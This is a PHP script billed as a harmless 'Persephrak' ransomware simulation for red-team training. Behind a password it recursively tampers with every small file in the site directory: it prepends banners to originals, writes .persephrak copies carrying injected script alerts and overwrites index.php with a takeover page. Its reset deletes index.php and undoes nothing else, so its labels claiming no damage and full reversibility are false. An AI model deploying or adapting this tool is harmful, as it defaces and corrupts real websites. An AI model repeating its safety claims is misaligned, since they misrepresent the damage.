<?php
// persephrak-demo.php - HARMLESS MOCKUP/DEMO VERSION for Red Team Awareness
// Files get .persephrak extension but NO encryption/deletion occurs
// Educational purposes only - shows ransomware damage potential

$argon2idHash = '$argon2id$v=19$m=80,t=20,p=10$eE0zOUhsd2JUOGhaMHNGYQ$Eyue4BkHB6wQ1Fd75BZrezgj00BHaom5YjeCWmLTCfGe/tpKbRug/XCUsXzHhd0znaXNw6Qx+vF8ctxsaeYqbBe+V5D6c/aqI3aAX0vzgrOuq+vxH9wJymSNUjFStWvona33EQ';

$demoPassphrase = 'DemoKey-RedTeamOnly';

$lockFile = '.persephrak_demo_active';
date_default_timezone_set('UTC');
$lockDate = date('F d, Y \a\t g:i A (T)');

function mockRenameFile($filePath) {
    // NEVER touch index.php or demo files
    if (!is_file($filePath) || basename($filePath) === 'index.php' || 
        basename($filePath) === 'persephrak-demo.php' || 
        strpos($filePath, '.persephrak') !== false) {
        return false;
    }

    $persephrakPath = $filePath . '.persephrak';
    
    // CREATE .persephrak file with mock content (NO real encryption)
    $mockContent = "<!-- PERSEPHRAK DEMO MOCKUP - Original: " . basename($filePath) . " -->\n";
    $mockContent .= "<script>alert('DEMO: " . basename($filePath) . " would be encrypted here!');</script>\n";
    $mockContent .= file_get_contents($filePath);
    
    if (file_put_contents($persephrakPath, $mockContent) === false) {
        return false;
    }
    
    // ADD warning banner to original file (KEEPS IT USABLE)
    $originalContent = file_get_contents($filePath);
    $warningBanner = "\n\n<?php /*\n";
    $warningBanner .= "⚠️ PERSEPHRAK DEMO ACTIVE - " . $lockDate . "\n";
    $warningBanner .= "✅ This is a HARMLESS mockup for red team training\n";
    $warningBanner .= "📁 Original content preserved below\n";
    $warningBanner .= "💾 " . basename($filePath) . ".persephrak created\n";
    $warningBanner .= "🔓 Files are SAFE - no encryption/deletion occurred\n*/ ?>";
    
    file_put_contents($filePath, $warningBanner . $originalContent);
    return true;
}

function processDemoFiles($dir) {
    $files = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );

    $count = 0;
    foreach ($files as $file) {
        if ($file->isFile() && $file->getSize() < 1024*1024) { // Only small files for demo
            $path = $file->getRealPath();
            if (mockRenameFile($path)) $count++;
        }
    }
    return $count;
}

function writeDemoMaintenance() {
    $demoPage = <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>🔴 PERSEPHRAK DEMO - Red Team Training</title>
    <style>
        body{font-family:Arial,sans-serif;background:#1a1a2e;color:white;text-align:center;padding:50px;}
        .container{max-width:600px;margin:auto;background:linear-gradient(135deg,#16213e,#0f3460);padding:40px;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,0.5);}
        h1{font-size:2.5em;background:linear-gradient(45deg,#ff6b6b,#4ecdc4);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
        .warning{background:#ff6b6b;padding:20px;border-radius:15px;margin:20px 0;}
        .safe{background:#4ecdc4;color:#1a1a1a;padding:20px;border-radius:15px;}
        .demo-info{background:#ffa50033;border-left:5px solid #ffaa00;padding:20px;margin:20px 0;}
    </style>
</head>
<body>
    <div class="container">
        <h1>🔴 PERSEPHRAK DEMO ACTIVE</h1>
        
        <div class="warning">
            <h2>⚠️ RANSOMWARE SIMULATION</h2>
            <p><strong>Red Team Training Exercise</strong></p>
            <p>✅ <strong>NO REAL DAMAGE OCCURRED</strong></p>
        </div>
        
        <div class="safe">
            <h3>✅ SAFETY CHECK</h3>
            <ul style="text-align:left;display:inline-block;">
                <li>📁 No files encrypted</li>
                <li>💾 No files deleted</li>
                <li>🔓 Original content preserved</li>
                <li>⚡ Demo .persephrak files created</li>
            </ul>
        </div>
        
        <div class="demo-info">
            <strong>🎓 Educational Purpose:</strong><br>
            Demonstrates ransomware behavior pattern:<br>
            • File extension takeover (.persephrak)<br>
            • Maintenance page deployment<br>
            • Site control takeover<br>
            <br><strong>To reset:</strong> Delete .persephrak_demo_active file
        </div>
        
        <p><em>This demo shows how devastating real ransomware can be.</em></p>
    </div>
</body>
</html>
HTML;

    file_put_contents('index.php', $demoPage);
}

$status = '';
$isDemoActive = file_exists($lockFile);
$mockFiles = count(glob('*.persephrak') ?: []);

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass']) && isset($_POST['action'])) {
    $inputPass = $_POST['pass'];

    if (password_verify($inputPass, $argon2idHash)) {
        if ($_POST['action'] === 'demo' && !$isDemoActive) {
            file_put_contents($lockFile, $lockDate);
            writeDemoMaintenance();
            $mockCount = processDemoFiles(__DIR__);
            $status = "✅ DEMO COMPLETE! {$mockCount} mock .persephrak files created (SAFE).";
        } elseif ($_POST['action'] === 'reset') {
            unlink($lockFile);
            @unlink('index.php');
            $status = "🔄 Demo reset complete!";
        }
    } else {
        $status = "❌ Wrong password!";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
<title>🔴 PersephrakRansomware Demo</title>
<style>
body{font-family:'Segoe UI',Arial,sans-serif;max-width:700px;margin:50px auto;padding:30px;background:#1a1a2e;}
.container{background:linear-gradient(135deg,#16213e,#0f3460);color:white;padding:40px;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,0.5);}
h1{font-size:2.5em;text-align:center;margin:0 0 30px;background:linear-gradient(45deg,#ff6b6b,#4ecdc4);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
button{padding:15px 40px;font-size:18px;border:none;border-radius:50px;cursor:pointer;font-weight:bold;transition:all 0.3s;box-shadow:0 8px 20px rgba(0,0,0,0.3);margin:10px;}
button:hover{transform:translateY(-3px);box-shadow:0 12px 30px rgba(0,0,0,0.4);}
.demo-btn{background:linear-gradient(45deg,#ff6b6b,#ff8e8e);color:white;}
.reset-btn{background:linear-gradient(45deg,#4ecdc4,#44bdad);color:#1a1a1a;}
input[type="password"]{width:100%;padding:15px;font-size:16px;border-radius:10px;border:none;box-shadow:0 5px 15px rgba(0,0,0,0.2);margin:20px 0;background:rgba(255,255,255,0.1);color:white;}
.status{padding:20px;border-radius:15px;margin:30px 0;font-size:18px;font-weight:bold;text-align:center;}
.success{background:linear-gradient(45deg,#56ab2f,#a8e6cf);color:#1a1a1a;}
.error{background:linear-gradient(45deg,#ff416c,#ff4b2b);color:white;}
.stats{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin:30px 0;}
.stat{background:rgba(255,255,255,0.1);padding:20px;border-radius:15px;text-align:center;}
.count{font-size:2.5em;font-weight:bold;color:#4ecdc4;}
.safe-notice{background:rgba(255,165,0,0.2);border:2px solid #ffaa00;padding:25px;border-radius:15px;margin:20px 0;color:#fff;}
</style>
</head>
<body>
<div class="container">
<h1>🔴 PERSEPHRAK RANSOMWARE DEMO</h1>
<h2>Red Team Training Mockup</h2>

<?php if ($status): ?>
    <div class="status <?= strpos($status, 'Wrong') === false ? 'success' : 'error' ?>">
        <?= htmlspecialchars($status) ?>
    </div>
<?php endif; ?>

<div class="stats">
    <div class="stat"><div class="count"><?= $mockFiles ?></div><div>Demo .persephrak</div></div>
    <div class="stat"><div class="count"><?= $isDemoActive ? '🟡 DEMO ACTIVE' : '🟢 READY' ?></div><div>Status</div></div>
</div>

<div class="safe-notice">
<strong>✅ THIS IS 100% SAFE HARMLESS DEMO</strong><br>
• Creates .persephrak mock files (no encryption)<br>
• Adds warning banners (no deletion)<br>
• Shows ransomware behavior pattern<br>
• <strong>Easy reset available</strong>
</div>

<?php if (!$isDemoActive): ?>
<form method="POST" autocomplete="off">
    <input type="hidden" name="action" value="demo" />
    <input type="password" name="pass" placeholder="Demo Password (Red Team Only)" required autocomplete="off" />
    <button type="submit" class="demo-btn" onclick="return confirm('🟡 Run Persephrak Demo?\n\n✅ NO files damaged\n📁 Creates mock .persephrak files\n🔓 Everything reversible\n\nEducational demo only!')">🚨 Run Demo Attack</button>
</form>
<?php else: ?>
<div class="safe-notice">
    <strong>🟡 DEMO ACTIVE - Training Mode</strong><br>
    <?= htmlspecialchars(file_get_contents($lockFile)) ?><br>
    <strong>✅ All files SAFE</strong>
</div>

<form method="POST" autocomplete="off">
    <input type="hidden" name="action" value="reset" />
    <input type="password" name="pass" placeholder="Admin Password" required autocomplete="off" />
    <button type="submit" class="reset-btn" onclick="return confirm('🔄 Reset demo?\n✅ Removes demo files\n✅ Restores normal operation')">🔄 Reset Demo</button>
</form>
<?php endif; ?>

<div style="margin-top:40px;padding:20px;background:rgba(255,255,255,0.1);border-radius:15px;">
    <strong>📚 For GitHub/Red Team:</strong><br>
    • Perfect for security awareness training<br>
    • Shows real ransomware patterns<br>
    • 100% safe - no recovery needed<br>
    • Includes reset functionality
</div>
</div>
</body>
</html>
